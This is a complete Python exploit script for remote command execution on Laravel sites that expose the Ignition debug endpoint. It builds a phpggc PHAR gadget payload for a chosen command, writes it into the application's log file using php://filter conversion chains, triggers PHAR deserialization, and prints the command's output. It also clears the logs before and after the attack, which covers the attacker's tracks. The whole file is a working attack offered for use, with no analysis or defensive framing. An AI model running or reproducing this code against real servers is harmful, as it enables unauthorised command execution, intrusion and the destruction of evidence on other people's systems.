#!/usr/bin/env python3

import argparse
import requests
import urllib3
import sys
import re
import base64
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log_path = "../storage/logs/laravel.log"


def generate_phar_payload(cmd):
    """
    Generate a base64-encoded PHAR payload using phpggc for the given command.
    """
    try:
        print(f"[+] Generating PHAR payload for command: {cmd}")
        # Execute phpggc command to generate the payload
        phar_payload = subprocess.check_output(
            ["php", "-d", "phar.readonly=off", "-d", "phar.require_hash=off", "./phpggc", "--phar", "phar", "-f", "laravel/rce12", "system", cmd]
        )
        # Encode the payload in base64
        return base64.b64encode(phar_payload).decode('utf-8')
    except Exception as e:
        print(f"[!] Error generating PHAR payload: {e}")
        sys.exit(-1)


def send_post(url, view_file):
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "doesnotexist",
            "viewFile": view_file,
        }
    }
    return requests.post(url, json=data, verify=False)


def clear_logs(url, log_path):
    print("[+] Trying to clear logs")
    resp = send_post(url, f"php://filter/read=consumed/resource={log_path}")
    if resp.status_code != 200:
        print("[!] Cannot clear logs")
        exit(-1)
    print("[+] Logs cleared")


def put_payload(url, payload):
    # Create first log entry, for alignment
    resp = send_post(url, "AA")
    if resp.status_code != 500:
        print("[!] Cannot write log entry")
        exit(-1)

    # Create log entry with payload
    payload = payload.rstrip("=")
    payload = "".join(c + "=00" for c in payload)
    payload = "A" * 100 + payload + "=00"
    resp = send_post(url, payload)
    if resp.status_code != 500:
        print("[!] Cannot put payload")
        exit(-1)


def convert_to_phar(url, log_path):
    print("[+] Convert log file to PHAR")
    filters = "|".join((
        "convert.quoted-printable-decode",
        "convert.iconv.utf-16le.utf-8",
        "convert.base64-decode",
    ))
    write_filter = f"php://filter/write={filters}/resource={log_path}"
    resp = send_post(url, write_filter)
    if resp.status_code != 200:
        print("[!] Cannot convert logs to PHAR")
        exit(-1)
    print("[+] Successfully converted logs to PHAR")


def trigger_phar(url, log_path):
    wrapper = f"phar://{log_path}/test.txt"
    resp = send_post(url, wrapper)
    if resp.status_code != 500:
        print("[!] PHAR deserialization failed")
        exit(-1)
    print("[+] PHAR deserialized")

    match = re.search('^(.*?)\n<!doctype html>\n<html class="',
                      resp.text, flags=re.S)
    if match:
        print('---------------------------------------')
        print(match.group(1))
        print('---------------------------------------')
    elif 'phar error: write operations' in resp.text:
        print('[+] Exploit succeeded')
    else:
        print('[+] Done')


def exploit(target, payload, log_path):
    target = target.rstrip("/")
    url = f"{target}/_ignition/execute-solution"

    clear_logs(url, log_path)
    put_payload(url, payload)
    convert_to_phar(url, log_path)
    trigger_phar(url, log_path)
    clear_logs(url, log_path)


def main():
    parser = argparse.ArgumentParser(
        description=f"example: {sys.argv[0]} http://127.0.0.1:8000/")
    parser.add_argument('target')
    parser.add_argument("--cmd", type=str, default="whoami",
                        help='command to execute (default: whoami)')
    parser.add_argument("--log_path", type=str, default=log_path,
                        help='path to logs (default: ../storage/logs/laravel.log)')
    args = parser.parse_args()

    # Generate PHAR payload based on the provided command
    payload = generate_phar_payload(args.cmd)
    
    exploit(args.target, payload, args.log_path)


if __name__ == "__main__":
    main()
